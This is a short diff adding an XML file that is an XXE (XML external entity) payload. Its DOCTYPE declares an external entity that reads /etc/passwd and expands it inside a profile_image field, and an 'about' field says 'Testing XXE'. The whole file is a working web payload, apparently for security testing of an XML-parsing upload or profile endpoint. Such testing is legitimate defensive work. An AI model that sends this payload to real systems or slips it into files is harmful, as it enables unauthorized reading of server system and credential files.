@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd"> ]>
+<profile>
+    <profile_image>&read;</profile_image>
+    <about>Testing XXE</about>
+</profile>
